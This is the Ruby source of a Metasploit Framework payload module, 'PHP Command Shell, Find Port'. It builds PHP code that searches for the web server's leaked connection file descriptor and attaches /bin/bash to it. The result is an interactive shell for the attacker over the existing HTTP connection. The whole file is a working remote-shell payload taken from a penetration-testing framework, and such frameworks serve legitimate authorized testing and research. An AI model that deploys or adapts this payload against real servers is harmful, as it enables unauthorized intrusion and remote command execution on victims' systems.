##
# $Id: bind_php.rb 5546 2008-07-01 01:44:56Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/payload/php'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/core/handler/find_shell'

module Msf
module Payloads
module Singles
module Php

module ShellFindsock

	include Msf::Payload::Single
	include Msf::Payload::Php

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'PHP Command Shell, Find Port',
			'Version'       => '$Revision: 5546 $',
			'Description'   => %Q{
				Spawn a shell on the established connection to
				the webserver.  Only tested on Apache but it 
				might work on other web servers that leak file
				descriptors to child processes.
				},
			'Author'        => [ 'egypt <egypt@metasploit.com>' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Handler'       => Msf::Handler::FindShell,
			'Session'       => Msf::Sessions::CommandShell,
			'Arch'          => ARCH_PHP
			))
	end

	def php_findsock

		#cmd = Rex::Text.encode_base64(datastore['CMD'])
		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
		shell = <<END_OF_PHP_CODE
error_reporting(E_ALL);
print("<html><body>");
flush();

error_log("Looking for file descriptor");
$fd = 13;
for ($i = 3; $i < 50; $i++) {
	$foo = system("/bin/bash 2>/dev/null <&$i -c 'echo $i'");
	if ($foo != $i) {
		$fd = $i - 1;
		break;
	}
}
error_log("Found it ($fd)");
print("</body></html>\n\n");
flush();

$c = "/bin/bash <&$fd >&$fd 2>&$fd";
system($c);

END_OF_PHP_CODE

#function mysystem(){
#	#{php_preamble({:disabled_varname => dis})}
#	#{php_system_block({:cmd_varname=>'$c', :disabled_varname => dis, :output_varname => '$out'})}
#	return $out;
#}
		
		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return php_findsock
	end

end

end end end end
